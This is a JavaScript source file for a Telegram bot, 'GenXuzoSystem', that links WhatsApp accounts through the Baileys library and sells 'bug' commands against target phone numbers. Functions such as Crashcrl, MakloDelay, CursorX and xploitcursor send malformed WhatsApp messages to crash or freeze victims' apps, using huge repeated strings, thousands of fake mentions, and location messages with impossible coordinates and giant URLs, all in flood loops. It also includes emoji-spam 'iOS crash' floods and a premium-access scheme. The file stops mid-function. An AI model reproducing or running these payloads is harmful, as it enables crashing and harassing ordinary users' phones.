const {
  default: makeWASocket,
  useMultiFileAuthState,
  makeInMemoryStore,
  DisconnectReason,
  jidDecode,
  proto
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const axios = require("axios");
const chalk = require("chalk");
const config = require("./Database/config.js");
const TelegramBot = require("node-telegram-bot-api");
const moment = require("moment");
const FormData = require("form-data");

const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ==================== KONFIGURASI GITHUB ====================
const GITHUB_REPO = config.GITHUB_REPO || "https://raw.githubusercontent.com/USERNAME/REPO/BRANCH";
const GITHUB_CACHE_TIME = 30000; // 30 detik cache
const GITHUB_MAINTENANCE_FILE = `${GITHUB_REPO}/maintenance.json`;
const GITHUB_INDEX_FILE = `${GITHUB_REPO}/index.js`;
const GITHUB_VERSION_FILE = `${GITHUB_REPO}/version.json`;

// ==================== VARIABEL GLOBAL MAINTENANCE ====================
let globalMaintenance = {
  maintenance: false,
  reason: "System Update",
  allowOwner: false,
  lastChecked: 0,
  cacheExpiry: 0
};

// ==================== CACHE SYSTEM ====================
const githubCache = {
  maintenance: null,
  index: null,
  version: null,
  timestamps: {
    maintenance: 0,
    index: 0,
    version: 0
  }
};

// ==================== STRUKTUR DATA BARU ====================
const userSessions = new Map(); // Map<telegramUserId, sessionData>
const userHistory = new Map();  // Map<telegramUserId, historyData>
const activeSessionsFile = "./sessions/user_sessions.json";
const userHistoryFile = "./sessions/user_history.json";

// ==================== FITUR BARU: DATA PERSISTENCE ====================
const imageFile = "./image.json";
const logFile = "./log.json";
const cooldownFile = "./cooldown.json";
const maintenanceFile = "./maintenance.json";

// ==================== PROGRESS UI HELPER (SIMPLE) ====================
class ProgressUI {
  constructor(chatId, messageId, targetNumber, commandType) {
    this.chatId = chatId;
    this.messageId = messageId;
    this.targetNumber = targetNumber;
    this.commandType = commandType;
    this.lastUpdate = 0;
    this.updateThrottle = 800;
  }

  getCommandTitle() {
    const titles = {
      'xploiter': 'T R A S H',
      'xtrash': 'T R A S H ☇ S P A M',
      'delay1st': 'D E L A Y ☇ I N V I S',
      'xvop': 'D E L A Y ☇ H A R D',
      'ioscrash': 'C R A S H ☇ I O S'
    };
    return titles[this.commandType] || this.commandType;
  }

  formatProgressBar(percent) {
    const barLength = 10;
    const filled = Math.floor(percent / 100 * barLength);
    const empty = barLength - filled;
    return '█'.repeat(filled) + '░'.repeat(empty);
  }

  async update(percent, status, options = {}) {
    const now = Date.now();
    if (now - this.lastUpdate < this.updateThrottle && percent < 100) {
      return false;
    }
    this.lastUpdate = now;

    const progressBar = this.formatProgressBar(percent);
    const progressText = `[${progressBar}] ${percent}%`;
    
    let caption = `
\`\`\`
᳀ 𝗚𝗲𝗻𝗫𝘂𝘇𝗼𝗦𝘆𝘀𝘁𝗲𝗺 ᳀
╰➤ ${this.getCommandTitle()}
 ▢ ᴛᴀʀɢᴇᴛ : ${this.targetNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ${status}
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressText}
\`\`\`
    `.trim();

    try {
      await safeEditCaption(this.chatId, this.messageId, caption, {
        parse_mode: "Markdown",
        ...options
      });
      return true;
    } catch (error) {
      if (error.message && error.message.includes('message is not modified')) {
        return true;
      }
      logError('ProgressUI update error', error);
      return false;
    }
  }

  async updateStages(stages) {
    for (const stage of stages) {
      await this.update(stage.percent, stage.status || '⏳ Sedang memproses...');
      await sleep(stage.delay || 800);
    }
  }
}

// ==================== SISTEM GITHUB FETCH ====================
async function fetchFromGitHub(url, useCache = true, cacheKey = null) {
  const now = Date.now();
  
  // Cek cache jika enabled
  if (useCache && cacheKey && githubCache[cacheKey]) {
    const cacheTime = githubCache.timestamps[cacheKey];
    if (now - cacheTime < GITHUB_CACHE_TIME) {
      logInfo(`[GitHub] Menggunakan cache untuk ${cacheKey}`);
      return githubCache[cacheKey];
    }
  }
  
  try {
    logInfo(`[GitHub] Fetching ${url}`);
    const response = await axios.get(url, {
      timeout: 10000,
      headers: {
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      }
    });
    
    // Simpan ke cache
    if (useCache && cacheKey) {
      githubCache[cacheKey] = response.data;
      githubCache.timestamps[cacheKey] = now;
      logInfo(`[GitHub] Cache diperbarui untuk ${cacheKey}`);
    }
    
    return response.data;
  } catch (error) {
    logError(`[GitHub] Gagal fetch ${url}`, error);
    
    // Fallback ke cache jika ada
    if (useCache && cacheKey && githubCache[cacheKey]) {
      logInfo(`[GitHub] Fallback ke cache untuk ${cacheKey}`);
      return githubCache[cacheKey];
    }
    
    throw error;
  }
}

// ==================== GLOBAL MAINTENANCE CHECK ====================
async function checkGlobalMaintenance() {
  try {
    const now = Date.now();
    
    // Cek cache dulu
    if (now - globalMaintenance.lastChecked < GITHUB_CACHE_TIME) {
      return globalMaintenance;
    }
    
    logInfo("[GenXuzoSystem] Checking global maintenance status...");
    
    const maintenanceData = await fetchFromGitHub(
      GITHUB_MAINTENANCE_FILE, 
      true, 
      'maintenance'
    );
    
    const oldStatus = globalMaintenance.maintenance;
    const newStatus = maintenanceData.maintenance || false;
    
    globalMaintenance = {
      maintenance: newStatus,
      reason: maintenanceData.reason || "System Maintenance",
      allowOwner: maintenanceData.allowOwner || false,
      lastChecked: now,
      cacheExpiry: now + GITHUB_CACHE_TIME
    };
    
    // Log perubahan status
    if (oldStatus !== newStatus) {
      if (newStatus) {
        logInfo(`[GenXuzoSystem] Maintenance Mode Active`);
        logInfo(`[GenXuzoSystem] Reason: ${globalMaintenance.reason}`);
        logInfo(`[GenXuzoSystem] Allow Owner: ${globalMaintenance.allowOwner ? 'YES' : 'NO'}`);
      } else {
        logInfo(`[GenXuzoSystem] Maintenance Mode Disabled`);
      }
    }
    
    return globalMaintenance;
  } catch (error) {
    logError("[GenXuzoSystem] Gagal cek maintenance status", error);
    return globalMaintenance; // Return status terakhir
  }
}

// ==================== BLOCK BY MAINTENANCE CHECK ====================
function shouldBlockByGlobalMaintenance(userId, command) {
  if (!globalMaintenance.maintenance) return false;
  
  // Command yang diizinkan selama maintenance
  const allowedCommands = ['/status', '/update'];
  
  if (allowedCommands.includes(command)) {
    return false;
  }
  
  // Jika allowOwner true dan user adalah owner
  if (globalMaintenance.allowOwner && isOwner(userId)) {
    return false;
  }
  
  return true;
}

// ==================== BUG FUNCTION WRAPPERS ====================
async function safeBugExecution(sock, target, bugFunction) {
  try {
    const result = await bugFunction(sock, target);
    return { success: true, result };
  } catch (error) {
    logError(`Bug execution error`, error);
    return { success: false, error: error.message };
  }
}

async function executeTrashspam(sock, target) {
  try {
    for (let i = 0; i < 3; i++) {
      await Crashcrl(sock, target);
      await sleep(200);
    }
    return true;
  } catch (error) {
    logError('Trashspam execution error', error);
    return false;
  }
}

async function executeCrashios(sock, target) {
  try {
    for (let i = 0; i < 50; i++) {
      await sock.sendMessage(target, {
        text: "🚀".repeat(500),
        mentions: [target]
      });
      await sleep(30);
    }
    return true;
  } catch (error) {
    logError('Crashios execution error', error);
    return false;
  }
}

// ==================== HELPER LOAD/SAVE PERSISTENCE ====================
function loadJSON(filePath, defaultData = []) {
  try {
    if (fs.existsSync(filePath)) {
      return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    }
  } catch (e) {
    logError(`Gagal load ${filePath}`, e);
  }
  return defaultData;
}

function saveJSON(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    return true;
  } catch (e) {
    logError(`Gagal save ${filePath}`, e);
    return false;
  }
}

// ==================== CLEAN LOG HELPER (BRANDING) ====================
function logInfo(message) {
  console.log(chalk.cyan.bold(`᳀ GenXuzoSystem ᳀ `) + chalk.white(message));
}

function logError(message, error = null) {
  console.log(chalk.red.bold(`[GenXuzoSystem🚀 ERROR] `) + chalk.yellow(message));
  
  if (error) {
    const errorEntry = {
      timestamp: new Date().toISOString(),
      message: error.message || String(error),
      stack: error.stack || null
    };
    
    const currentLogs = loadJSON(logFile, []);
    currentLogs.push(errorEntry);
    saveJSON(logFile, currentLogs.slice(-100));
    
    if (error.message && (
      error.message.includes('query is too old') ||
      error.message.includes('invalid query id') ||
      error.message.includes('Bad Request')
    )) {
      return;
    }
  }
}

// ==================== SAFE EDIT MESSAGE HELPER ====================
const messageThrottle = new Map();
async function safeEditMessage(chatId, messageId, text, options = {}) {
  const key = `${chatId}_${messageId}`;
  const now = Date.now();
  
  if (messageThrottle.has(key)) {
    const lastUpdate = messageThrottle.get(key);
    if (now - lastUpdate < 500) {
      return false;
    }
  }
  
  messageThrottle.set(key, now);
  
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      ...options
    });
    return true;
  } catch (error) {
    if (error.message && (
      error.message.includes('message to edit not found') ||
      error.message.includes('message is not modified') ||
      error.message.includes('Bad Request')
    )) {
      return false;
    }
    logError('Error in safeEditMessage', error);
    return false;
  }
}

// ==================== SAFE EDIT CAPTION HELPER ====================
async function safeEditCaption(chatId, messageId, caption, options = {}) {
  try {
    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      ...options
    });
    return true;
  } catch (error) {
    if (error.message && (
      error.message.includes('message to edit not found') ||
      error.message.includes('message is not modified')
    )) {
      return false;
    }
    logError('Error in safeEditCaption', error);
    return false;
  }
}

// ==================== LOAD DATA AWAL ====================
let imageList = loadJSON(imageFile, ["https://files.catbox.moe/q1lpsa.jpg"]);
let cooldownConfig = loadJSON(cooldownFile, {
  free: 300,
  premium: 60,
  owner: 0
});
let maintenanceMode = loadJSON(maintenanceFile, {
  enabled: false,
  since: null,
  message: "🚧 Maintenance Mode is ON"
});

// Load user data
function loadUserData() {
  try {
    if (fs.existsSync(activeSessionsFile)) {
      const data = JSON.parse(fs.readFileSync(activeSessionsFile));
      data.forEach(item => userSessions.set(item.telegramId, item));
    }
  } catch (e) { logError("Gagal load user sessions", e); }

  try {
    if (fs.existsSync(userHistoryFile)) {
      const data = JSON.parse(fs.readFileSync(userHistoryFile));
      data.forEach(item => userHistory.set(item.telegramId, item));
    }
  } catch (e) { logError("Gagal load user history", e); }
}

function saveUserSessions() {
  const data = Array.from(userSessions.values());
  fs.writeFileSync(activeSessionsFile, JSON.stringify(data, null, 2));
}

function saveUserHistory() {
  const data = Array.from(userHistory.values());
  fs.writeFileSync(userHistoryFile, JSON.stringify(data, null, 2));
}

loadUserData();

const SESSIONS_DIR = "./sessions";
let premiumUsers = JSON.parse(fs.readFileSync("./Database/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./Database/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./Database/premium.json");
ensureFileExists("./Database/admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./Database/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./Database/admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        logInfo(`File ${filePath} updated successfully.`);
      } catch (error) {
        logError(`Error updating ${filePath}`, error);
      }
    }
  });
}

watchFile("./Database/premium.json", (data) => (premiumUsers = data));
watchFile("./Database/admin.json", (data) => (adminUsers = data));

// ==================== MAINTENANCE HELPER ====================
function isMaintenance() {
  return maintenanceMode.enabled;
}

function isOwner(userId) {
  if (!userId) return false;
  return config.OWNER_ID.map(String).includes(String(userId));
}

function shouldBlock(userId) {
  return isMaintenance() && !isOwner(userId);
}

function updateUserLastActive(telegramId, username = null) {
  if (!userHistory.has(telegramId)) {
    userHistory.set(telegramId, {
      telegramId,
      telegramUsername: username,
      waNumber: null,
      joinedAt: new Date().toISOString(),
      lastActive: new Date().toISOString()
    });
  } else {
    const history = userHistory.get(telegramId);
    history.lastActive = new Date().toISOString();
    if (username && !history.telegramUsername) {
      history.telegramUsername = username;
    }
    userHistory.set(telegramId, history);
  }
  saveUserHistory();
}

function startBot() {
  console.log(chalk.red(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
`));
  console.log(chalk.red(`
GenXuzoSystem Core Succesufully🚀
Connected To Bot✅
System Stable🌐
Developer: @UnknownUserZ7 A.K.A Raditt🌟
`));
  console.log(chalk.blue(`[ 🚀 BOT RUNNING... ]`));
  
  logInfo(`Bot started successfully`);
  logInfo(`Maintenance Mode: ${isMaintenance() ? 'ON' : 'OFF'}`);
  logInfo(`Global Maintenance: ${globalMaintenance.maintenance ? 'ON' : 'OFF'}`);
  logInfo(`Images loaded: ${imageList.length}`);
  logInfo(`Users in history: ${userHistory.size}`);
  logInfo(`GitHub Repo: ${GITHUB_REPO}`);
}

startBot();

// ==================== COOLDOWN HELPER ====================
function parseTimeInput(input) {
  if (!input) return 0;
  
  const str = input.toString().toLowerCase().trim();
  const match = str.match(/^(\d+(?:\.\d+)?)\s*([smhd]|sec|second|detik|min|minute|menit|hour|jam)?$/);
  
  if (!match) return null;
  
  let value = parseFloat(match[1]);
  const unit = match[2] ? match[2][0] : 's';
  
  switch (unit) {
    case 'h': value *= 3600; break;
    case 'm': value *= 60; break;
    case 'd': value *= 86400; break;
    default: break;
  }
  
  return Math.floor(value);
}

function formatSeconds(seconds) {
  if (seconds === 0) return "No Cooldown";
  
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  const parts = [];
  if (days > 0) parts.push(`${days} Day${days > 1 ? 's' : ''}`);
  if (hours > 0) parts.push(`${hours} Hour${hours > 1 ? 's' : ''}`);
  if (minutes > 0) parts.push(`${minutes} Minute${minutes > 1 ? 's' : ''}`);
  if (secs > 0 && days === 0 && hours === 0) parts.push(`${secs} Second${secs > 1 ? 's' : ''}`);
  
  return parts.join(", ");
}

function getCooldownForUser(userId) {
  if (isOwner(userId)) return cooldownConfig.owner;
  
  const isPremium = premiumUsers.some(u => 
    u.id === userId && new Date(u.expiresAt) > new Date()
  );
  
  return isPremium ? cooldownConfig.premium : cooldownConfig.free;
}

const cooldowns = new Map();
function checkCooldown(userId) {
  const cooldownTime = getCooldownForUser(userId) * 1000;
  if (cooldownTime <= 0) return 0;
  
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) return Math.ceil(remainingTime / 1000);
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0;
}

// ==================== PERMISSION HELPER ====================
function canUseRestrictedFeatures(userId) {
  if (isOwner(userId)) return true;
  
  const isPremium = premiumUsers.some(u => 
    u.id === userId && new Date(u.expiresAt) > new Date()
  );
  if (isPremium) return true;
  
  return userSessions.has(userId) && userSessions.get(userId).status === "connected";
}

// ==================== RANDOM IMAGE HELPER ====================
function getRandomImage() {
  if (imageList.length === 0) {
    return "https://files.catbox.moe/q1lpsa.jpg";
  }
  return imageList[Math.floor(Math.random() * imageList.length)];
}

// ==================== BROADCAST HELPER ====================
async function broadcastToUsers(message, options = {}) {
  const users = Array.from(userHistory.keys());
  const total = users.length;
  let success = 0;
  let failed = 0;
  
  if (total === 0) {
    return { success: 0, failed: 0, total: 0 };
  }
  
  const progressMsg = await bot.sendMessage(
    options.ownerChatId,
    `📢 Broadcast started\nTotal users: ${total}\nProgress: 0/${total} (0%)`
  );
  
  const batchSize = 20;
  for (let i = 0; i < users.length; i += batchSize) {
    const batch = users.slice(i, i + batchSize);
    const promises = batch.map(async (userId) => {
      try {
        if (options.photo) {
          await bot.sendPhoto(userId, options.photo, {
            caption: message,
            parse_mode: options.parse_mode || "HTML",
            reply_markup: options.reply_markup
          });
        } else {
          await bot.sendMessage(userId, message, {
            parse_mode: options.parse_mode || "HTML",
            reply_markup: options.reply_markup
          });
        }
        return true;
      } catch (error) {
        const currentLogs = loadJSON(logFile, []);
        currentLogs.push({
          timestamp: new Date().toISOString(),
          userId,
          error: {
            name: error.name,
            message: error.message
          },
          context: "broadcast"
        });
        saveJSON(logFile, currentLogs.slice(-100));
        return false;
      }
    });
    
    const results = await Promise.allSettled(promises);
    results.forEach(result => {
      if (result.status === 'fulfilled' && result.value) success++;
      else failed++;
    });
    
    const processed = Math.min(i + batchSize, total);
    const percent = Math.round((processed / total) * 100);
    
    if (percent % 20 === 0 || i + batchSize >= total) {
      try {
        await safeEditMessage(
          options.ownerChatId,
          progressMsg.message_id,
          `📢 Broadcast progress\nTotal users: ${total}\nProgress: ${processed}/${total} (${percent}%)\n✅ Success: ${success} ❌ Failed: ${failed}`
        );
      } catch (e) {}
    }
    
    await sleep(100);
  }
  
  try {
    await safeEditMessage(
      options.ownerChatId,
      progressMsg.message_id,
      `📢 Broadcast completed!\n✅ Success: ${success}\n❌ Failed: ${failed}\n📊 Total: ${total}`
    );
  } catch (e) {}
  
  return { success, failed, total };
}

// ==================== CATBOX UPLOADER ====================
async function uploadToCatbox(fileBuffer, filename = 'image.jpg') {
  try {
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', fileBuffer, {
      filename: filename,
      contentType: 'image/jpeg'
    });
    
    const response = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    });
    
    if (response.data && response.data.startsWith('http')) {
      return response.data;
    }
    
    throw new Error('Upload failed: ' + response.data);
  } catch (error) {
    logError('Catbox upload error', error);
    throw error;
  }
}

// ==================== SESSION MANAGEMENT ====================
async function initializeUserSessions() {
  for (const [telegramId, sessionData] of userSessions) {
    if (sessionData.status === "connected") {
      await connectUserSession(telegramId, sessionData.number);
    }
  }
}

async function connectUserSession(telegramId, botNumber) {
  const sessionDir = path.join(SESSIONS_DIR, `user_${telegramId}`);
  if (!fs.existsSync(sessionDir)) return;

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "open") {
      logInfo(`Session user ${telegramId} (${botNumber}) terhubung`);
      userSessions.set(telegramId, {
        ...userSessions.get(telegramId),
        socket: sock,
        status: "connected"
      });
      saveUserSessions();
    } else if (connection === "close") {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      userSessions.set(telegramId, {
        ...userSessions.get(telegramId),
        status: "disconnected"
      });
      saveUserSessions();
      if (shouldReconnect) {
        setTimeout(() => connectUserSession(telegramId, botNumber), 5000);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

// ===========FUNGSI REQPAIR===========
async function connectReqPair(botNumber, chatId, userId) {
  const sent = await bot.sendMessage(
    chatId,
    `\`\`\`GenXuzoSystem
╰➤ Number  : ${botNumber}
╰➤ Status  : Initializing...\`\`\``,
    { parse_mode: "Markdown" }
  );

  const messageId = sent.message_id;
  if (!messageId) return;

  const sessionDir = `./sessions/user_${userId}`;
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let pairingRequested = false;
  let uiUpdated = false;

  sock.ev.on("connection.update", async (update) => {
    const { connection } = update;

    if (!pairingRequested && !state.creds.registered) {
      pairingRequested = true;

      await sleep(1200);

      try {
        const code = await sock.requestPairingCode(botNumber);
        const formatted = code.match(/.{1,4}/g).join("-");

        if (!uiUpdated) {
          uiUpdated = true;
          await safeEditMessage(
            chatId,
            messageId,
            `\`\`\`GenXuzoSystem
╰➤ Number  : ${botNumber}
╰➤ Status  : Pairing
╰➤ Code    : ${formatted}\`\`\``,
            { parse_mode: "Markdown" }
          );
        }
      } catch (e) {
        logError("PAIRING ERROR", e);
        await safeEditMessage(
          chatId,
          messageId,
          `\`\`\`GenXuzoSystem
╰➤ Status : Pairing Failed\`\`\``,
          { parse_mode: "Markdown" }
        );
      }
    }

    if (connection === "open") {
      await safeEditMessage(
        chatId,
        messageId,
        `\`\`\`GenXuzoSystem
╰➤ Number  : ${botNumber}
╰➤ Status  : Connected
╰➤ Message : Pairing Success\`\`\``,
        { parse_mode: "Markdown" }
      );

      userSessions.set(userId, {
        telegramId: userId,
        telegramUsername: null,
        number: botNumber,
        socket: sock,
        sessionDir,
        status: "connected",
      });

      saveUserSessions();
    }

    if (connection === "close") {
      await safeEditMessage(
        chatId,
        messageId,
        `\`\`\`GenXuzoSystem
╰➤ Number  : ${botNumber}
╰➤ Status  : Connection Closed\`\`\``,
        { parse_mode: "Markdown" }
      );
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

// ==================== HELPER FUNCTIONS ====================
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000);
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== SOCKET GETTER ====================
function getSocketForUser(telegramUserId) {
  const userSession = userSessions.get(telegramUserId);
  if (userSession && userSession.socket && userSession.status === "connected") {
    return userSession.socket;
  }

  if (isOwner(telegramUserId)) {
    for (const [uid, session] of userSessions) {
      if (session.socket && session.status === "connected") {
        logInfo(`Owner menggunakan session user ${uid}`);
        return session.socket;
      }
    }
  }

  return null;
}

// ==================== BUG FUNCTIONS ====================
async function xploitcursor(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "#Xtrix🚯",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };

    const pertama = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const kedua = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    await sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: pertama,
      },
    });

    await sock.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: kedua,
      },
    });
    return true;
  } catch (err) {
    logError('xploitcursor error', err);
    return false;
  }
}

async function Crashcrl(sock, target) {
  try {
    for (let i = 0; i < 300; i++) {
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: `#XiterTrash🚯`,
              },
              nativeFlowMessage: {
                messageParamsJson: "[".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "",
                  },
                ],
              },
            },
          },
        },
      };

      await sock.relayMessage(target, message, {
        participant: { jid: target },
      });
    }
    return true;
  } catch (err) {
    logError('Crashcrl error', err);
    return false;
  }
}

async function MakloDelay(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "᬴".repeat(280000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1999 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    for (let iterator = 0; iterator < 1000; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await sleep(500);
    }

    logInfo("Success Mak lo Delay");
    return true;
  } catch (err) {
    logError('MakloDelay error', err);
    return false;
  }
}

function generateWAMessageFromContent(target, message, options) {
  return {
    key: {
      remoteJid: target,
      id: crypto.randomBytes(16).toString('hex'),
      participant: target
    },
    message: message,
    ...options
  };
}

async function CursorX(sock, target) {
  try {
    console.log(chalk.red.bold(`[XuzoAI-2] PREPARING LOCDROID EXPLOIT ON: ${target} 😈🖕`));
    
    const trigger = "ꦾ".repeat(65000);
    const urlbokep = `https://${trigger}.crash.whatsapp-android.pnx.com/${trigger}/${trigger}/${trigger}/`;
    
    await sock.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 99999e99999,
          degreesLongitude: -99999e99999,
          name: trigger,
          inviteLinkGroupTypeV2: "DEFAULT",
          merchantUrl: urlbokep,
          url: urlbokep,
          thumbnailUrl: urlbokep,
          waWebSocketUrl: urlbokep,
          mediaUrl: urlbokep,
          sourceUrl: urlbokep,
          originalImageUrl: urlbokep,
          clickToWhatsappCall: true,
          contextInfo: {
            remoteJid: `${"X"}`,
            participant: "13135550002@s.whatsapp.net",
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            externalAdReply: {
              quotedAd: {
                advertiserName: trigger,
                mediaType: "IMAGE",
